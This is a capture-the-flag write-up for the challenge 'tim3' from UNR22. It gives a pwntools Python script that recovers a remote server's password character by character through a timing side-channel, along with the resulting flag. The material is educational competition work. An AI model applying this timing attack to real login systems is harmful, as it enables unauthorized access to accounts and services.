---
layout: post
author: hofill
title: tim3
slug: tim3
ctf: UNR22 Individual
category: writeup
writeup_categories: ["crypto"]
tags: ["crypto", "time"]
summary: Time attack on password checker.
last_modified_at:
image: https://unr22-individual.cyberedu.ro/images/contests/BMwo9sxqDZaYqNem.png
---

# Legend
* [Challenge Description](#descr)
* [Flag Proof](#flagproof)
* [Summary](#summary)
* [Details](#details)

# Challenge Description {#descr}

Found this endpoint that asks for a password with checks on a custom-built hardware security module made by an obscure student. Can you break it?

Flag format: CTF{sha256}

# Flag Proof {#flagproof}

CTF{7edc257442d67b8fe4219d5eeb79d3952d462dc78f8ec8baaea5789fe42884af}

# Summary {#summary}

Time attack on password checker.

# Details {#details}

I connected to machine and saw the following message:

```bash
Password (matches [A-Za-z0-9]*):
asd
Wrong.
Password (matches [A-Za-z0-9]*):
```

Due to the title of the challenge and to the given password checker, I considered that the challenge was about a time attack.

I created a simple script to test each character and the time it takes to compute the response:

```python
from pwn import *
import time
import string
import pprint

context.log_level = "CRITICAL"
c = string.ascii_letters + string.digits

f = ""

l = {}

for i in c:
    r = remote("34.107.45.139", 30765)
    r.recvuntil(b":\r\n")
    r.sendline(f + i)
    s = time.time()
    r.recvuntil("Wrong.\r\n")
    e = time.time()
    r.close()
    l[f + i] = e-s

for w in sorted(l, key=l.get, reverse=True):
    print(w, l[w])

r.interactive()
```

The number `1` took the longest to compute, so I modified `f` to contain “1” and ran it again.

I kept doing this until I got the password: `1kC7f`

This wasn’t the final password and I knew there was just one more character because my program kept crashing, so I did the last letter manually:

![Flag Proof](/assets/img/tim3/proof.png)
